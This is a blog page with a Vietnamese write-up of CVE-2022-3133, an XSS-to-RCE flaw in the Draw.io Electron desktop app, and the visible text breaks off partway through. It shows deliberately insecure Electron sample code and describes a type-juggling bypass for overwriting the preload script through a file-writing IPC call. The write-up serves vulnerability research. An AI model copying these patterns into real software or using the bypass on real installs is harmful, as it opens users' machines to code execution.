<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>[CVE-2022-3133] Draw.io ‚Äì XSS leads to RCE | nhienit</title>
<meta name="keywords" content="research">
<meta name="description" content="CVE-2022-3133 analysis">
<meta name="author" content="nhienit">
<link rel="canonical" href="https://nhienit2010.github.io/posts/cve-2022-3133-drawio-xss-to-rce/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://nhienit2010.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://nhienit2010.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://nhienit2010.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://nhienit2010.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://nhienit2010.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://nhienit2010.github.io/posts/cve-2022-3133-drawio-xss-to-rce/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="https://nhienit2010.github.io/posts/cve-2022-3133-drawio-xss-to-rce/">
  <meta property="og:site_name" content="nhienit">
  <meta property="og:title" content="[CVE-2022-3133] Draw.io ‚Äì XSS leads to RCE">
  <meta property="og:description" content="CVE-2022-3133 analysis">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-06-26T10:43:10+07:00">
    <meta property="article:modified_time" content="2023-06-26T10:43:10+07:00">
    <meta property="article:tag" content="Research">
      <meta property="og:image" content="https://nhienit2010.github.io/images/papermod-cover.png">
      <meta property="og:see_also" content="https://nhienit2010.github.io/posts/story-about-veeam-and-dotnet-remoting/">
      <meta property="og:see_also" content="https://nhienit2010.github.io/posts/me_sqli_to_rce/">
      <meta property="og:see_also" content="https://nhienit2010.github.io/posts/cve-2024-5443-path-traversal-to-rce/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://nhienit2010.github.io/images/papermod-cover.png">
<meta name="twitter:title" content="[CVE-2022-3133] Draw.io ‚Äì XSS leads to RCE">
<meta name="twitter:description" content="CVE-2022-3133 analysis">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://nhienit2010.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "[CVE-2022-3133] Draw.io ‚Äì XSS leads to RCE",
      "item": "https://nhienit2010.github.io/posts/cve-2022-3133-drawio-xss-to-rce/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "[CVE-2022-3133] Draw.io ‚Äì XSS leads to RCE",
  "name": "[CVE-2022-3133] Draw.io ‚Äì XSS leads to RCE",
  "description": "CVE-2022-3133 analysis",
  "keywords": [
    "research"
  ],
  "articleBody": "#T·∫£n m·∫°n D·∫°o g·∫ßn ƒë√¢y c≈©ng kh√¥ng c√≥ vi·∫øt b√†i n√†o m·ªõi, c≈©ng nh√¢n d·ªãp n√†y m√¨nh c√≥ nghi√™n c·ª©u v·ªÅ c√°i Draw.io n√†y v√† c≈©ng may m·∫Øn t√¨m ra ƒë∆∞·ª£c v√†i bug XSS tr√™n s·∫£n ph·∫©m n√†y nh∆∞ng kh√¥ng th·ªÉ n√¢ng impact l√™n RCE tr√™n desktop app üò¢.\nB·ªüi v√¨, trong qu√° kh·ª© c√≥ nhi·ªÅu researcher ƒë√£ n√¢ng t·ª´ XSS l√™n RCE tr√™n s·∫£n ph·∫©m n√†y r·ªìi n√™n nay m√¨nh quy·∫øt ƒë·ªãnh ph√¢n t√≠ch l·∫°i bug n√†y v√† ƒë·ªìng th·ªùi c≈©ng l√† d·ªãp m√¨nh t√¨m hi·ªÉu v·ªÅ bug XSS tr√™n c√°c ·ª©ng d·ª•ng desktop app n√†y.\n#M·ªü ƒë·∫ßu Draw.io (diagrams.net) l√† m·ªôt ph·∫ßn m·ªÅm v·∫Ω bi·ªÉu ƒë·ªì ƒëa n·ªÅn t·∫£ng mi·ªÖn ph√≠ v√† m√£ ngu·ªìn m·ªü ƒë∆∞·ª£c ph√°t tri·ªÉn b·∫±ng HTML5 v√† JavaScript. Giao di·ªán c·ªßa n√≥ c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ t·∫°o c√°c s∆° ƒë·ªì nh∆∞ l∆∞u ƒë·ªì, khung d√¢y, s∆° ƒë·ªì UML, s∆° ƒë·ªì t·ªï ch·ª©c v√† s∆° ƒë·ªì m·∫°ng (Theo Wikipedia). C√≤n Draw.io Desktop l√† ·ª©ng d·ª•ng d√†nh cho desktop d·ª±a tr√™n Electron v√† core l√† draw.io.\nElectron l√† khung ph·∫ßn m·ªÅm m√£ ngu·ªìn m·ªü v√† ƒë∆∞·ª£c x√¢y d·ª±ng d·ª±a tr√™n Chromium nh∆∞ng n√≥ kh√¥ng ph·∫£i l√† m·ªôt browser nh∆∞ ch√∫ng ta bi·∫øt. M·ªôt c√°ch hi·ªÉu ƒë∆°n gi·∫£n l√† xem Electron nh∆∞ l√† m·ªôt ·ª©ng d·ª•ng bao g·ªìm c·∫£ front-end v√† back-end, trong ƒë√≥ front-end l√† Chromium c√≥ nhi·ªám v·ª• render web content v√† back-end l√† ph·∫ßn x·ª≠ l√Ω d·ª±a tr√™n NodeJS.\nElectron th√¥ng th∆∞·ªùng c√≥ 2 lo·∫°i process:\nMain process: ho·∫°t ƒë·ªông nh∆∞ m·ªôt application entry point, ho√†n ƒë∆∞·ª£c truy c·∫≠p v√† x·ª≠ l√Ω b·ªüi NodeJS. Renderer process: c≈©ng nh∆∞ t√™n g·ªçi c·ªßa n√≥, process n√†y ch·ªãu tr√°ch nhi·ªám cho vi·ªác render n·ªôi dung c·ªßa trang web (nh∆∞ HTML, CSS, Javascript) m√† ng∆∞·ªùi d√πng c√≥ th·ªÉ th·∫•y v√† t∆∞∆°ng t√°c ƒë∆∞·ª£c. Th√¥ng th∆∞·ªùng c√°c renderer process ƒë∆∞·ª£c c·∫•u h√¨nh b√™n trong main process n·∫±m ·ªü c√°c file javascript x·ª≠ l√Ω ch√≠nh, trong c√°c options n√†y s·∫Ω c√≥ c√°c option d√πng ƒë·ªÉ ph√≤ng ch·ªëng vi·ªác ng∆∞·ªùi d√πng c√≥ th·ªÉ g·ªçi tr·ª±c ti·∫øp c√°c NodeJS APIs n·∫øu ƒë∆∞·ª£c c·∫•u h√¨nh ƒë√∫ng (Project m·∫´u c√≥ th·ªÉ download t·∫°i ƒë√¢y).\nV√¨ renderer process ch·ªãu tr√°ch nhi·ªám parse code HTML n√™n kh√¥ng th·ªÉ tr√°nh kh·ªèi vi·ªác b·ªã d√≠nh l·ªó h·ªïng XSS, n√™n ti·∫øp theo c√πng t√¨m hi·ªÉu l√† XSS tr√™n desktop app th√¨ nh∆∞ th·∫ø n√†o!!!\n#XSS tr√™n Electron Desktop App Nh∆∞ ƒë√£ bi·∫øt th√¨ Cross-site Scripting l√† l·ªó h·ªïng cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ th·ª±c thi t√πy √Ω m√£ javascript tr√™n browser c·ªßa ng∆∞·ªùi d√πng nh∆∞ng ƒë·ªëi v·ªõi Desktop App ch·∫°y tr√™n Electron th√¨ c√≥ th·ªÉ d·∫´n ƒë·∫øn g·ªçi c√°c NodeJS APIs v√† c√≥ th·ªÉ th·ª±c thi m√£ t·ª´ xa (RCE)\nM·ª•c ƒë√≠ch ch√≠nh c·ªßa main process l√† t·∫°o v√† qu·∫£n l√Ω c√°c application windows v·ªõi BrowserWindow module. M·ªôt v√≠ d·ª• m·ªôt ·ª©ng d·ª•ng nh∆∞ sau:\n// main.js const { app, BrowserWindow, ipcMain } = require('electron') const path = require('path') function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, 'preload.js'), nodeIntegration: true, contextIsolation: false, sandbox: false } }) // ... Gi·∫£i th√≠ch m·ªôt s·ªë options quan tr·ªçng:\npreload: l√† m·ªôt script s·∫Ω th·ª±c thi trong m·ªôt renderer process tr∆∞·ªõc khi th·ª±c hi·ªán load web content, m·∫∑c d√π script n√†y ƒë∆∞·ª£c ch·∫°y trong m·ªôt renderer context nh∆∞ng c√≥ full quy·ªÅn truy c·∫≠p v√†o c√°c NodeJS APIs. nodeIntegration: option n√†y ƒë∆∞·ª£c b·∫≠t c√≥ nghƒ©a l√† renderer process c√≥ th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp v√† g·ªçi c√°c NodeJS APIs, n·∫øu XSS x·∫£y ra th√¨ c√≥ th·ªÉ ch·∫°y ƒë∆∞·ª£c m√£ NodeJS tr·ª±c ti·∫øp. contextIsolation: option n√†y ƒë∆∞·ª£c d√πng ƒë·ªÉ t√°ch (hay c√¥ l·∫≠p) gi·ªØa preload scripts v√† NodeJS APIs context v·ªõi webContents context. V√≠ d·ª•, n·∫øu nh∆∞ trong preload script set window.a = 1 th√¨ khi truy c·∫≠p v√†o window.a ·ªü ph√≠a webContents s·∫Ω l√† undefined. sandbox: n·∫øu option n√†y ƒë∆∞·ª£c b·∫≠t th√¨ renderer ch·ªâ c√≥ th·ªÉ th·ª±c hi·ªán m·ªôt s·ªë h√†nh ƒë·ªông ƒë∆∞·ª£c IPC c·∫•p. #Case 1: XSS + nodeIntegration Nh∆∞ ƒë√£ n√≥i ban ƒë·∫ßu, n·∫øu option nodeIntegration ƒë∆∞·ª£c b·∫≠t th√¨ renderer process c√≥ th·ªÉ g·ªçi tr·ª±c ti·∫øp NodeJS APIs, hay n√≥i c√°ch kh√°c t·ª´ tr√™n giao di·ªán devtool web ta c√≥ th·ªÉ th·ª±c thi tr·ª±c ti·∫øp code NodeJS d·∫´n ƒë·∫øn RCE.\nVuln code:\n// main.js const { app, BrowserWindow, ipcMain } = require('electron') const path = require('path') function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true, contextIsolation: false, sandbox: false } }) // ... #Case 2: Preload + contextIsolation Gi·∫£ s·ª≠ trong tr∆∞·ªùng h·ª£p n√†y, ·ªü preload script c√≥ ƒë·ªãnh nghƒ©a m·ªôt function cho ph√©p th·ª±c thi command t√πy √Ω, nh∆∞ng v√¨ l√Ω do option contextIsolation ƒë∆∞·ª£c set l√† false n√™n d·∫´n ƒë·∫øn main process v√† renderer process c√≥ chung context hay n√≥i c√°ch kh√°c l√† c·∫£ 2 ph√≠a s·∫Ω d√πng chung m·ªôt global window object, nghƒ©a l√† t·ª´ ph√≠a renderer process c√≥ th·ªÉ g·ªçi tr·ª±c ti·∫øp ƒë·∫øn function n√†y ·ªü ph√≠a main process.\nVuln code:\n//main.js const { app, BrowserWindow, ipcMain } = require('electron') const path = require('path') function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, 'preload.js'), contextIsolation: false, sandbox: false } }) // ... // preload.js window.exec = (cmd) =\u003e { require('child_process').exec(cmd) } C√°ch ƒë·ªÉ ngƒÉn ch·∫∑n cu·ªôc t·∫•n c√¥ng n√†y ch·ªâ ƒë∆°n gi·∫£n l√† set contextIsolation = true v√† ƒë·ªìng th·ªùi contextBridge module ƒë∆∞·ª£c sinh ra ƒë·ªÉ expose c√°c APIs t·ª´ preload script m·ªôt c√°ch an to√†n cho render process s·ª≠ d·ª•ng khi context gi·ªØa main process v√† renderer process b·ªã c√¥ l·∫≠p ho√†n to√†n. C√°c APIs expose n√†y ƒë∆∞·ª£c truy c·∫≠p th√¥ng qua window object, m·ª•c ƒë√≠ch c·ªßa vi·ªác n√†y l√† ch·ªâ expose nh·ªØng ch·ª©c nƒÉng c·∫ßn thi·∫øt ch·ª© kh√¥ng expose c·∫£ m·ªôt window object ra cho renderer :v.\nV√≠ d·ª•:\n// preload.js // preload with contextIsolation enabled const { contextBridge } = require('electron') contextBridge.exposeInMainWorld('myAPI', { doAThing: () =\u003e {} }) // renderer.js // use the exposed API in the renderer window.myAPI.doAThing() #Case 3: RCE th√¥ng qua IPC IPC (Inter-process communication) l√† m·ªôt ph·∫ßn kh√° quan tr·ªçng tr√™n ·ª©ng d·ª•ng Electron v√¨ n√≥ ch·ªãu tr√°ch nhi·ªám cho vi·ªác li√™n k·∫øt (k·∫øt n·ªëi) th·ª±c hi·ªán c√°c t√°c v·ª• gi·ªØa main process v√† renderer process nh∆∞ g·ªçi c√°c native API t·ª´ UI.\nElectron cung c·∫•p 2 l·∫°i IPC l√† IPC Main v√† IPC Renderer\nIPC Main cho ph√©p main process giao ti·∫øp v·ªõi renderer process ƒë·ªÉ th·ª±c hi·ªán m·ªôt s·ªë ho·∫°t ƒë·ªông h·ªá th·ªëng nh∆∞ qu·∫£n l√Ω c·ª≠a s·ªï ·ª©ng d·ª•ng, t·∫°o quy tr√¨nh m·ªõi hay gi·ªç c√°c module NodeJS. ƒê·ªÉ s·ª≠ d·ª•ng IPC Main c√≥ th·ªÉ g·ªçi ipcMain module n√†y ƒë·ªÉ th·ª±c hi·ªán l·∫Øng nghe c≈©ng nh∆∞ g·ª≠i message ƒë·∫øn renderer process. V√≠ d·ª•: // Main process const { app, BrowserWindow, ipcMain } = require('electron'); app.on('ready', () =\u003e { const mainWindow = new BrowserWindow(); mainWindow.loadURL('https://example.com'); ipcMain.on('message-from-renderer', (event, arg) =\u003e { console.log(arg); // Log message from renderer process event.sender.send('message-to-renderer', 'Hello from main process!'); }); }); IPC Renderer cho ph√©p renderer process giao ti·∫øp v·ªõi main process, ƒë·ªÉ s·ª≠ d·ª•ng IPC Renderer c√≥ th·ªÉ s·ª≠ d·ª•ng ipcRenderer module ƒë·ªÉ ƒë∆∞·ª£c cung c·∫•p m·ªôt s·ªë giao th·ª©c g·ª≠i v√† l·∫Øng nghe th√¥ng ƒëi·ªáp ƒë·∫øn t·ª´ main process. V√≠ d·ª•: // Renderer process const { ipcRenderer } = require('electron'); ipcRenderer.send('message-from-renderer', 'Hello from renderer process!'); ipcRenderer.on('message-to-renderer', (event, arg) =\u003e { console.log(arg); // Log message from main process }); M·ªôt v√≠ d·ª• v·ªÅ tr∆∞·ªùng h·ª£p s·ª≠ d·ª•ng IPC m·ªôt c√°ch kh√¥ng an to√†n:\n// main.js const { app, BrowserWindow, ipcMain, shell } = require('electron') const path = require('path') function createWindow () { const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, 'preload.js'), contextIsolation: true, sandbox: false } }) ipcMain.on('openURL', (event, url) =\u003e { shell.openExternal(url) }) // ... // preload.js const { contextBridge, ipcRenderer } = require('electron') contextBridge.exposeInMainWorld('electronAPI', { openURL: (url) =\u003e ipcRenderer.send('openURL', url) }) m·ªôt s·ªë ƒëi·ªÉm c·∫ßn hi·ªÉu r√µ ·ªü nh·ªØng ƒëo·∫°n code tr√™n nh∆∞ sau:\ncontextIsolation = true IPC Main s·∫Ω l·∫Øng nghe event ‚ÄúopenURL‚Äù, sau ƒë√≥ th·ª±c thi shell.openExternal v·ªõi tham s·ªë url ƒë∆∞·ª£c truy·ªÅn v√†o =\u003e ƒê√¢y c≈©ng l√† sink c·ªßa l·ªó h·ªïng, h√†m n√†y cho ph√©p m·ªü m·ªçt URL ho·∫∑c t·ªáp tin b√™n ngo√†i Electron d·∫´n ƒë·∫øn RCE. ·ªû preload script expose electronAPI ra b√™n ngo√†i cho renderer c√≥ th·ªÉ g·ªçi h√†m openURL, sau ƒë√≥ ipcRenderer s·∫Ω g·ª≠i message ƒë·∫øn ipcMain ·ªü openURL channel m√† IPC Maind ƒëang l·∫Øng nghe. V√¨ th·∫ø, ·ªü ƒë√¢y ta s·∫Ω d√πng file protocol ƒë·ªÉ g·ªçi ƒë·∫øn t·ªáp tin hay ch∆∞∆°ng tr√¨nh b√™n ngo√†i (c√≥ th·ªÉ l√† virus ho·∫∑c backdoor) ƒë·ªÉ chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn h·ªá th·ªëng. ƒê√≥ l√† c∆° b·∫£n v·ªÅ m·ªôt s·ªë l·ªó h·ªïng tr√™n ·ª©ng d·ª•ng ƒë∆∞·ª£c t·∫°o n√™n t·ª´ Electron, ti·∫øp theo s·∫Ω v√†o v·∫•n ƒë·ªÅ ch√≠nh, s·∫Ω n√≥i v·ªÅ bug tr√™n app Draw.io\n#CVE-2022-3133 L·ªó h·ªïng n√†y ƒë∆∞·ª£c report v√† public tr√™n huntr.dev b·ªüi researcher mizu, c·ª• th·ªÉ l√† l·∫°m d·ª•ng l·ªï h·ªïng XSS ƒë·ªÉ th·ª±c hi·ªán ch·ª©c nƒÉng writeFile ·ªü IPC Main ƒë·ªÉ override t·ªáp preload script ƒë·ªÉ c√≥ th·ªÉ th·ª±c thi m√£ t·ª´ xa (RCE).\n#Abuse of ipcMain to override preload script ·ªû file electron.js, ipcMain ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a l·∫Øng nghe s·ª± ki·ªán rendererReq v√† bao g·ªìm nhi·ªÅu action\n// ... ipcMain.on(\"rendererReq\", async (event, args) =\u003e { try { let ret = null; switch(args.action) { // ... case 'writeFile': ret = await writeFile(args.path, args.data, args.enc); break; // ... trong ƒë√≥ ƒë√°ng ch√∫ √Ω l√† writeFile action nh·∫≠n v√†o tham s·ªë l√† path, data, enc. ƒê·ªìng th·ªùi, ·ªü electron-preloads.js expose API electron cho ph√©p g·ªçi rendererReq channel t·ª´ renderer process nh∆∞ sau\n// ... contextBridge.exposeInMainWorld( 'electron', { request: (msg, callback, error) =\u003e { msg.reqId = reqId++; reqInfo[msg.reqId] = {callback: callback, error: error}; //TODO Maybe a special function for this better than this hack? //File watch special case where the callback is called multiple times if (msg.action == 'watchFile') { fileChangedListeners[msg.path] = msg.listener; delete msg.listener; } ipcRenderer.send('rendererReq', msg); }, // ... =\u003e √ù t∆∞·ªüng ·ªü ƒë√¢y s·∫Ω l√† l·∫°m d·ª•ng ch·ª©c nƒÉng writeFile n√†y ƒë·ªÉ ghi ƒë√® thay ƒë·ªïi n·ªôi dung c·ªßa electron-preload.js ƒë·ªÉ tr·ª±c ti·∫øp th·ª±c thi m√£ NodeJS.\n#Type juggling bypass checkFileContent H√†m writeFile ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:\n// ... async function writeFile(path, data, enc) { if (!checkFileContent(data, enc)) { throw new Error('Invalid file data'); } else { return await fsProm.writeFile(path, data, enc); } }; // ... trong ƒë√≥, h√†m checkFileContent ki·ªÉm tra content type t·ª´ d·ªØ li·ªáu ƒë∆∞a v√†o, m·ª•c ti√™u c·ªßa ch√∫ng ta l√† ph·∫£i ch√®n n·ªôi dung javascript h·ª£p l·ªá v√†o electron-preload.js.\n// ... function checkFileContent(body, enc) { if (body != null) { let head, headBinay; if (typeof body === 'string') { if (enc == 'base64') { headBinay = Buffer.from(body.substring(0, 22), 'base64'); head = headBinay.toString(); } else { head = body.substring(0, 16); headBinay = Buffer.from(head); } } // ... let c1 = head[0], c2 = head[1], c3 = head[2], c4 = head[3], ... if (c1 == '\u003c') { // text/html if (c2 == '!' // ... // application/xml if (c2 == '?' \u0026\u0026 c3 == 'x' \u0026\u0026 c4 == 'm' \u0026\u0026 c5 == 'l' \u0026\u0026 c6 == ' ') { // ... ·ªû ƒë√¢y ta c√≥ th·ªÉ th·∫•y r·∫±ng d·ªØ li·ªáu mong mu·ªën t·ª´ ƒë·∫ßu v√†o l√† c√°c file ƒë·ªãnh d·∫°ng nh∆∞ text/html, application/xml, application/pdf, image/*. Nghƒ©a l√† nh·ªØng bytes ƒë·∫ßu ti√™n c·ªßa c√°c ƒë·ªãnh d·∫°ng n√†y th∆∞·ªùng b·∫Øt ƒë·∫ßu b·∫±ng nh·ªØng k√Ω t·ª± ƒë·∫∑c bi·ªát, v√¨ l√Ω do n√†y n√™n s·∫Ω g√¢y ra l·ªói syntax khi vi·∫øt v√†o m·ªôt file javascript.\nM·ªôt ƒëi·ªÅu n·ªØa l√† ch·ªâ l·∫•y 16 bytes header t·ª´ input ƒë·ªÉ validate n·∫øu kh√¥ng ph·∫£i l√† d·∫°ng base64, c√≤n n·∫øu l√† base64 th√¨ l·∫•y 22 k√Ω t·ª± ƒë·∫ßu ƒë·ªÉ ƒëem ƒëi decode v√† ti·∫øp theo l√† ƒëem ƒëi check.\nM·ª•c ti√™u c·ªßa ch√∫ng ta ƒë∆°n gi·∫£n ch·ªâ l√† l√†m cho h√†m n√†y tr·∫£ v·ªÅ true l√† ƒë∆∞·ª£c, sau ƒë√≥ d·ªØ li·ªáu s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o fsProm.writeFile ƒë·ªÉ ghi xu·ªëng t·ªáp. V·∫≠y bug ·ªü ƒë√¢y l√† g√¨???\n// ... function checkFileContent(body, enc) { if (body != null) { let head, headBinay; if (typeof body === 'string') { if (enc == 'base64') // ... // ... L·ªó h·ªïng type juggling xu·∫•t hi·ªán ·ªü enc == 'base64', b·ªüi v√¨:\n‚Äúbase64‚Äù == ‚Äúbase64‚Äù\ntrue\n[‚Äúbase64‚Äù] == ‚Äúbase64‚Äù\ntrue\nV·∫≠y n·∫øu ta truy·ªÅn v√†o tham s·ªë enc = [\"base64\"] th√¨ s·∫Ω c√≥ √Ω nghƒ©a g√¨??? M·ªçi th·ª© ƒë·ªÅu c√≥ l√Ω do c·ªßa n√≥ =))) V√¨ h√†m fs.writeFile nh·∫≠n v√†o tham s·ªë option l√† string ho·∫∑c object, n·∫øu option encoding = \"base64\" th√¨ input s·∫Ω decode base64 r·ªìi m·ªõi ƒë∆∞·ª£c ghi xu·ªëng file, c√≤n n·∫øu encoding = [\"base64\"] th√¨ d·ªØ li·ªáu s·∫Ω kh√¥ng c·∫ßn decode v√¨ default = utf-8 m√† ghi th·∫≥ng xu·ªëng file.\nconst fsProm = require('fs/promises'); fsProm.writeFile(\"/tmp/output\", \"PGh0bWwxMzMzMzMzMzMzMzM=\", \"base64\") // Output: ",
  "wordCount" : "2463",
  "inLanguage": "en",
  "image": "https://nhienit2010.github.io/images/papermod-cover.png","datePublished": "2023-06-26T10:43:10+07:00",
  "dateModified": "2023-06-26T10:43:10+07:00",
  "author":[{
    "@type": "Person",
    "name": "nhienit"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://nhienit2010.github.io/posts/cve-2022-3133-drawio-xss-to-rce/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nhienit",
    "logo": {
      "@type": "ImageObject",
      "url": "https://nhienit2010.github.io/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://nhienit2010.github.io/" accesskey="h" title="nhienit (Alt + H)">nhienit</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://nhienit2010.github.io/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://nhienit2010.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://nhienit2010.github.io/">Home</a>&nbsp;¬ª&nbsp;<a href="https://nhienit2010.github.io/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      [CVE-2022-3133] Draw.io ‚Äì XSS leads to RCE
    </h1>
    <div class="post-description">
      CVE-2022-3133 analysis
    </div>
    <div class="post-meta"><span title='2023-06-26 10:43:10 +0700 +07'>June 26, 2023</span>&nbsp;¬∑&nbsp;<span>12 min</span>&nbsp;¬∑&nbsp;<span>nhienit</span>&nbsp;|&nbsp;<span>
    <a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/cve-2022-3133-drawio-xss-to-rce.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
</span>

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#t%e1%ba%a3n-m%e1%ba%a1n" aria-label="#T·∫£n m·∫°n">#T·∫£n m·∫°n</a></li>
                <li>
                    <a href="#m%e1%bb%9f-%c4%91%e1%ba%a7u" aria-label="#M·ªü ƒë·∫ßu">#M·ªü ƒë·∫ßu</a></li>
                <li>
                    <a href="#xss-tr%c3%aan-electron-desktop-app" aria-label="#XSS tr√™n Electron Desktop App">#XSS tr√™n Electron Desktop App</a><ul>
                        
                <li>
                    <a href="#case-1-xss--nodeintegration" aria-label="#Case 1: XSS &#43; nodeIntegration">#Case 1: XSS + nodeIntegration</a></li>
                <li>
                    <a href="#case-2-preload--contextisolation" aria-label="#Case 2: Preload &#43; contextIsolation">#Case 2: Preload + contextIsolation</a></li>
                <li>
                    <a href="#case-3-rce-th%c3%b4ng-qua-ipc" aria-label="#Case 3: RCE th√¥ng qua IPC">#Case 3: RCE th√¥ng qua IPC</a></li></ul>
                </li>
                <li>
                    <a href="#cve-2022-3133" aria-label="#CVE-2022-3133">#CVE-2022-3133</a><ul>
                        
                <li>
                    <a href="#abuse-of-ipcmain-to-override-preload-script" aria-label="#Abuse of ipcMain to override preload script">#Abuse of ipcMain to override preload script</a></li>
                <li>
                    <a href="#type-juggling-bypass-checkfilecontent" aria-label="#Type juggling bypass checkFileContent">#Type juggling bypass checkFileContent</a></li>
                <li>
                    <a href="#find-the-webroot" aria-label="#Find the webroot">#Find the webroot</a></li>
                <li>
                    <a href="#look-for-xss-vulnerabilities" aria-label="#Look for XSS vulnerabilities">#Look for XSS vulnerabilities</a></li>
                <li>
                    <a href="#exploit" aria-label="#Exploit">#Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#references" aria-label="#References">#References</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h3 id="t·∫£n-m·∫°n">#T·∫£n m·∫°n<a hidden class="anchor" aria-hidden="true" href="#t·∫£n-m·∫°n">#</a></h3>
<p>D·∫°o g·∫ßn ƒë√¢y c≈©ng kh√¥ng c√≥ vi·∫øt b√†i n√†o m·ªõi, c≈©ng nh√¢n d·ªãp n√†y m√¨nh c√≥ nghi√™n c·ª©u v·ªÅ c√°i Draw.io n√†y v√† c≈©ng may m·∫Øn t√¨m ra ƒë∆∞·ª£c v√†i bug XSS tr√™n s·∫£n ph·∫©m n√†y nh∆∞ng kh√¥ng th·ªÉ n√¢ng impact l√™n RCE tr√™n desktop app üò¢.</p>
